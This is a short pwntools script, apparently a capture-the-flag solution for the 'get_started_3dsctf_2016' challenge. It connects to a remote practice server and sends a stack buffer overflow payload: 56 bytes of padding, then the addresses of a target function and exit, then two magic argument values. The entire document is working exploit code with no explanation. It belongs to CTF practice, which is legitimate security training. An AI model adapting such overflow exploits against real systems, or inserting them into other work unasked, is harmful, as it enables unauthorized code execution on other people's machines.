from pwn import *
q = remote('node3.buuoj.cn',29154)
#q = process('./get_started_3dsctf_2016')
context.log_level = 'debug'
#sleep(0.1)
get_addr = 0x080489A0
exit_addr = 0x0804E6A0
a1 = 814536271
a2 = 425138641
payload = 'a'*(56)
payload += p32(get_addr) + p32(exit_addr)
payload += p32(a1) + p32(a2)
q.sendline(payload)
sleep(0.1)
q.recv()